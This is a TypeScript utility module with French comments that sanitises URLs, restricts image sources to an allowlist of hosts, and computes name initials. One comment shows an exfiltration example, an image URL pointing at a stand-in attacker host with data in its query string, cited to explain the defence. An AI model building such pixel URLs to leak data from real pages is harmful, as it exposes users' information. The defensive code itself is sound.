/** N'accepte que les URL http(s) absolues et les chemins relatifs au site. */
export function safeUrl(url: string | undefined): string | undefined {
  if (!url) return undefined;
  const trimmed = url.trim();
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  if (trimmed.startsWith('/') && !trimmed.startsWith('//')) return trimmed;
  return undefined;
}

/** Domaines autorisés pour les images (photos, logos), en plus des fichiers de l'application. */
const IMAGE_HOSTS = (import.meta.env.VITE_IMAGE_HOSTS ?? '')
  .split(',')
  .map((host) => host.trim().toLowerCase())
  .filter(Boolean);

/**
 * URL d'image sûre : fichier servi par l'application (`/images/...`) ou domaine autorisé
 * (`VITE_IMAGE_HOSTS`). Empêche l'exfiltration de données par une URL d'image fabriquée
 * (ex. `https://attaquant.test/pixel?q=...`). À aligner avec `img-src` de la CSP (vercel.json).
 */
export function safeImageUrl(
  url: string | undefined,
  hosts: string[] = IMAGE_HOSTS,
): string | undefined {
  const safe = safeUrl(url);
  if (!safe || safe.startsWith('/')) return safe;
  try {
    const { protocol, hostname } = new URL(safe);
    return protocol === 'https:' && hosts.includes(hostname.toLowerCase()) ? safe : undefined;
  } catch {
    return undefined;
  }
}

export function initials(name: string): string {
  return name
    .split(/\s+/)
    .filter(Boolean)
    .slice(0, 2)
    .map((part) => part[0]?.toUpperCase() ?? '')
    .join('');
}
